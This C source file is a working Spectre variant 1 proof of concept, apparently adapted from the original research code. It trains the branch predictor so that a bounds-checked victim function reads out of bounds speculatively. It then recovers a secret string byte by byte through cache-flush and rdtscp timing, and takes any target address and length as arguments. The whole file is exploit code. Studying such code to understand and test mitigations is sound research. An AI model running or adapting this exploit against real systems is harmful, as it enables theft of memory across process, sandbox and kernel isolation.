#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#if defined(__POWERPC__)
#include <ppc_intrinsics.h>
#else
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#include <cpuid.h>
#endif
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

const char * secret = "The Magic Words are Squeamish Ossifrage.";
//char secret[] = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0xff; /* Used so compiler won’t optimize out victim_function() */

#ifdef __GCC__
#define NOINLINE __attribute__ ((noinline))
#else
#define NOINLINE
#endif

void NOINLINE victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

/********************************************************************
Analysis code
********************************************************************/
#if defined(__POWERPC__)
#define CACHE_HIT_THRESHOLD 0
#else
#define CACHE_HIT_THRESHOLD 80
#endif

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x;
#if defined(__POWERPC__)
  register uint32_t time1, time2;
#else
  register uint64_t time1, time2;
#endif

  volatile uint8_t * addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
#if defined(__POWERPC__)
      __dcbf(array2, i * 512);
#else
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
#endif

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      volatile int z;
#if defined(__POWERPC__)
      __dcbf(&array1_size, 0);
#else
      _mm_clflush( & array1_size);
#endif
      for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);

    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];
#if defined(__POWERPC__)
      time1 = __mftb();
#else
      time1 = __rdtscp( & junk); /* READ TIMER */
#endif
      junk = * addr; /* MEMORY ACCESS TO TIME */
#if defined(__POWERPC__)
      time2 = __mftb() - time1;
#else
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#endif
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc,
  const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, score[2], len = 40;
  uint8_t value[2];
  char * recovered_string;

#if defined(__X86__) || defined(_M_IX86) || defined(__x86_64__)
#ifdef _MSC_VER
  int a[4];
  int d;
  __cpuid(a, 0x80000001);
  printf("cpuid(0x80000001) : 0x%08x 0x%08x 0x%08x 0x%08x\n", a[0], a[1], a[2], a[3]);
  d = a[3];
#else
  unsigned int a, b, c, d;
  __cpuid(0x80000001, a, b, c, d);
  printf("cpuid(0x80000001) : 0x%08x 0x%08x 0x%08x 0x%08x\n", a, b, c, d);
#endif
  if((d & (1 << 27)) == 0) {
    printf("rdtscp is not available.\n"); // TODO : use rdtsc instead
    return (1);
  }
#endif
  
  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  if (argc == 3) {
    sscanf(argv[1], "%p", (void * * )( & malicious_x));
    malicious_x -= (size_t) array1; /* Convert input value into a pointer */
    sscanf(argv[2], "%d", & len);
  }

  recovered_string = calloc(1, len+1);
  if (recovered_string == NULL) return 1;
  printf("array1=%p secret=%p\n", array1, secret);

  printf("Reading %d bytes:\n", len);
  for (i = 0; i < len; i++) {
    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
    recovered_string[i] = (value[0] > 31 && value[0] < 127 ? value[0] : '?');
  }
  printf("String : '%s'\n", recovered_string);
  printf("temp=0x%02x\n", temp);
  free(recovered_string);
  return (0);
}
